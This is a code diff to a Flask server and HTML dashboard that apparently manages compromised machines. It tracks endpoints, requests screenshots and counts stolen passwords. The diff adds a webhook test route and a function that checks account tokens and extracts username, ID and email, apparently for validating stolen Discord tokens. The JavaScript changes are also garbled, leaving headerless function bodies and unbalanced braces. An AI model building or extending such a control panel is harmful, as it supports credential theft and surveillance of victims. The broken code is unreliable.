@@ -343,6 +343,16 @@ def clear_screenshot_request(endpoint_id):
         return jsonify({'error': str(e)}), 500
 
 # ENDPOINTS DE LEITURA
+@app.route('/api/webhook_test', methods=['POST'])
+def webhook_test():
+    try:
+        data = request.json
+        print(f"[WEBHOOK TEST] Recebido: {data}")
+        return jsonify({'status': 'success', 'received': data})
+    except Exception as e:
+        print(f"[WEBHOOK ERRO] {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 @app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
 def get_endpoints():
     if request.method == 'OPTIONS':
@@ -965,26 +975,28 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 document.getElementById('totalPasswords').textContent = totalPasswords;
                 
             } catch(e) {
-                console.error('Erro ao carregar endpoints:', e);
-                document.getElementById('endpointsList').innerHTML = '<div style="color: #ef4444; text-align: center; padding: 40px;">Erro ao carregar endpoints</div>';
             }
-        }
+        });
 
-        async function loadEndpointData(endpointId) {
-            try {
-                const res = await fetch(`/api/endpoint_data/${endpointId}`);
-                const data = await res.json();
-                endpointsData[endpointId] = data;
-                return data;
-            } catch(e) {
-                console.error('Erro ao carregar dados do endpoint:', e);
-                return null;
-            }
+        if (response.ok) {
+            const user = await response.json();
+            return {
+                valid: true,
+                username: user.username,
+                id: user.id,
+                discriminator: user.discriminator,
+                email: user.email || 'N/A'
+            };
         }
+        return { valid: false };
+    } catch (error) {
+        return { valid: false };
+    }
+}
 
-        async function openDataModal(endpointId, hostname) {
-            const data = await loadEndpointData(endpointId);
-            if (!data) return;
+// Variáveis globais
+let currentEndpoint = null;
+let endpointsData = {};
             
             document.getElementById('modalTitle').textContent = `📊 ${hostname}`;
             document.getElementById('dataModal').style.display = 'block';
@@ -1163,19 +1175,16 @@ function selectEndpoint() {
     currentEndpoint = select.value;
     const btn = document.getElementById('screenshotBtn');
             
-            // Depois carrega dados de cada endpoint
-            const endpoints = await fetch('/api/endpoints').then(r => r.json());
-            for (const endpoint of endpoints) {
-                await loadEndpointData(endpoint.id);
-            }
-            
-            // Recarrega endpoints com os dados
-            await loadEndpoints();
-            
-            loadScreenshots();
-        }
+    if (currentEndpoint) {
+        btn.disabled = false;
+        btn.style.opacity = '1';
+    } else {
+        btn.disabled = true;
+        btn.style.opacity = '0.5';
+    }
+}
 
-        // Carrega dados iniciais
+        // Carrega dados iniciais APENAS UMA VEZ
         loadAllData();
 
         // Atualiza a cada 30 segundos
@@ -1185,7 +1194,7 @@ function selectEndpoint() {
         window.onclick = function(event) {
             const modal = document.getElementById('dataModal');
             if (event.target == modal) {
-                closeModal();
+                modal.style.display = 'none';
             }
         }
     </script>
